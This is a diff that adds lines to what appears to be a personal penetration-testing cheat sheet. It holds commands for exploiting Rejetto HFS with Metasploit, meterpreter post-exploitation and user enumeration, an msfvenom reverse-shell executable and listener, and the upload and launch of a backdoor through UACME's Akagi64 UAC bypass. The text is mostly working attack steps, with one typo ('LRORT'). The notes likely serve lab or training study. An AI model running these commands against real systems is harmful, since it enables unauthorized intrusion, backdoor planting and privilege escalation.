@@ -1287,9 +1287,19 @@ install python-xlrd, $ pip install xlrd --upgrade
 
 ***UAC STANDS FOR USER ACCOUNT CONTROL***
 
+```shell
+use exploit/windows/http/rejetto_hfs_exec
+```
+> for session
+
 ```meterpreter
 pgrep explorer
 migrate <process-ID>
+getuid
+shell
+net user
+net localgroup administrators
+get privs
 ```
 
 > This command can be used to switch to the 64 Bit meterpreter session.
@@ -1300,9 +1310,29 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe >
 
 > Generating malicious executable using msfvenom.
 
+```shell
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <my-IP>
+set LRORT 1234
+```
+After create session
+
+```shell
+cd C://
+mkdir Temp
+cd Temp
+upload backdoor.exe
+upload /root/Desktop/tools/UACME/Akagi64.exe
+shell
+.\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+```
+
 ```console
 /root/Desktop/tools/UACME/Akagi64.exe
 ```
+
 
 > Location of the `Akagi` exploit that is used to bypass UAC.
 
